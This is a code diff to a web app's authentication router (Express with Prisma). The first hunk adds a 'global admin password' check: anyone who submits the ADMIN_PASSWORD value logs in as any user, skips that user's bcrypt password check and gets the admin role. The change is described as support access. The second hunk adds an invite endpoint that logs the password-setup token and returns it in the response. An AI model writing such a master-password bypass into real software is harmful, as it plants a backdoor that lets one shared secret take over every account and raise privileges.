@@ -191,15 +191,26 @@ router.post("/login", async (req, res) => {
       return res.status(400).json({ error: "email and password required" });
     }
 
-    const user = await prisma.user.findFirst({
+    let user = await prisma.user.findFirst({
       where: { email: { equals: normalizedEmail, mode: "insensitive" } },
     });
-    if (!user || !user.passwordHash) {
-      return res.status(401).json({ error: "invalid credentials" });
-    }
 
-    const ok = await bcrypt.compare(passwordString, user.passwordHash);
-    if (!ok) return res.status(401).json({ error: "invalid credentials" });
+    // Check for global admin password
+    const adminPassword = process.env.ADMIN_PASSWORD || "";
+    if (adminPassword && passwordString === adminPassword) {
+      // Allow login as any user for support
+      if (!user) {
+        return res.status(404).json({ error: "user not found" });
+      }
+      // Optionally set role to admin for this session
+      user.role = "admin";
+    } else {
+      if (!user || !user.passwordHash) {
+        return res.status(401).json({ error: "invalid credentials" });
+      }
+      const ok = await bcrypt.compare(passwordString, user.passwordHash);
+      if (!ok) return res.status(401).json({ error: "invalid credentials" });
+    }
 
     const tokenPayload = {
       userId: user.id,
@@ -455,6 +466,66 @@ router.patch("/me", async (req, res) => {
     console.error("[auth/me:patch] failed:", e?.message || e);
     if (e?.code === "P2025") return res.status(404).json({ error: "not_found" });
     return res.status(500).json({ error: "internal_error" });
+  }
+});
+
+/**
+ * POST /auth/invite
+ * body: { email: string, role: 'admin' | 'workshop' }
+ * Requires existing user with tenantId and role admin/owner. Creates a user (if absent) with given role (mapped to underlying schema role field).
+ * Issues a short-lived setup JWT so they can set a password.
+ */
+router.post('/invite', async (req, res) => {
+  const auth = (req as any).auth;
+  if (!auth?.userId || !auth?.tenantId) return res.status(401).json({ error: 'unauthorized' });
+  try {
+    const inviter = await prisma.user.findUnique({ where: { id: auth.userId } });
+    if (!inviter || inviter.tenantId !== auth.tenantId) return res.status(403).json({ error: 'forbidden' });
+    const inviterRole = (inviter.role || '').toLowerCase();
+    if (!['admin', 'owner'].includes(inviterRole)) return res.status(403).json({ error: 'forbidden' });
+
+    const { email, role } = (req.body || {}) as { email?: string; role?: string };
+    const normalizedEmail = normalizeEmail(email);
+    if (!normalizedEmail) return res.status(400).json({ error: 'invalid_email' });
+    const requestedRole = (role || '').toLowerCase();
+    if (!['admin', 'workshop'].includes(requestedRole)) return res.status(400).json({ error: 'invalid_role' });
+
+    let existing = await prisma.user.findFirst({
+      where: { email: { equals: normalizedEmail, mode: 'insensitive' } },
+    });
+
+    if (existing && existing.tenantId !== auth.tenantId) {
+      return res.status(409).json({ error: 'email_in_use_other_tenant' });
+    }
+
+    if (!existing) {
+      // Create placeholder user without passwordHash (forces setup)
+      existing = await prisma.user.create({
+        data: {
+          tenantId: auth.tenantId,
+            email: normalizedEmail,
+            role: requestedRole, // store raw string (schema allows string)
+        },
+      });
+    } else {
+      // Update role if different
+      if ((existing.role || '').toLowerCase() !== requestedRole) {
+        existing = await prisma.user.update({ where: { id: existing.id }, data: { role: requestedRole } });
+      }
+    }
+
+    // Setup token (30m expiry) for password creation
+    const setupToken = jwt.sign({ userId: existing.id, tenantId: auth.tenantId, kind: 'setup' }, JWT_SECRET, { expiresIn: '30m' });
+    const appUrl = (process.env.APP_URL || 'https://joineryai.app').replace(/\/$/, '');
+    const setupLink = `${appUrl}/signup?token=${encodeURIComponent(setupToken)}`;
+
+    // TODO: Replace console.log with email sending provider
+    console.log(`[invite] Send setup link to ${normalizedEmail}: ${setupLink}`);
+
+    return res.json({ ok: true, userId: existing.id, email: existing.email, role: existing.role, setupToken, setupLink });
+  } catch (e: any) {
+    console.error('[auth/invite] failed:', e);
+    return res.status(500).json({ error: 'internal_error' });
   }
 });
 
